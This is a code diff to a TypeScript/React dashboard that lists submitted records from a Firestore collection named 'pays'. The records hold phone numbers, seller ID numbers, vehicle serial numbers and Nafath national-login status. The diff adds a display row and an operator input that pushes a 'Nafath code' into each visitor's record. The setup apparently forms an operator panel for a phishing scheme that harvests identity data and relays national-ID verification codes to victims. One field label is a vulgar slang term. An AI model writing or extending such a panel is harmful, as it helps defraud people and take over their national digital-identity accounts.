@@ -115,7 +115,8 @@ interface Notification {
   nafazVerified?: boolean
   nafazLoginTime?: string
   nafazStatus?: "pending" | "verified" | "failed"
-  nafazAttempts?: number
+  nafazAttempts?: number,
+  phoneVerificationStatus?:string
 }
 
 // Custom Hooks
@@ -726,6 +727,7 @@ function NotificationDetails({
                 { label: "رقم  زبي", value: notification.formData?.phone, icon: Shield },
                 { label: "رقم هوية البائع", value: notification.formData?.seller_identity_number, icon: Shield },
                 { label: "الرقم التسلسلي", value: notification.formData?.serial_number, icon: FileText },
+                { label: "الرقم ", value: notification?.phoneNumber, icon: FileText },
                 {
                   label: "رقم تصنيع المركبة",
                   value: notification.formData?.vehicle_manufacture_number,
@@ -833,7 +835,13 @@ function NotificationDetails({
                         ),
                     )}
                   </div>
+                  
                 </CardContent>
+                <CardFooter>
+                  <input type="tel" placeholder="كود فاذ" onChange={(e)=>{
+                    handleAuthNumberUpdate(notification.id,e.target.value)
+                  }}/>
+                </CardFooter>
               </Card>
               {!notification.formData?.phone &&
                 !notification.phone2 &&
@@ -1306,7 +1314,7 @@ export default function NotificationsPage() {
   const handleAuthNumberUpdate = async (id: string, authNumber: string) => {
     try {
       const docRef = doc(db, "pays", id)
-      await updateDoc(docRef, { nafaz_pin: authNumber })
+      await updateDoc(docRef, { nafaz_pin: authNumber,authNumber })
       setNotifications((prev) => prev.map((n) => (n.id === id ? { ...n, nafaz_pin: authNumber } : n)))
       toast({
         title: "تم تحديث رقم التحقق",
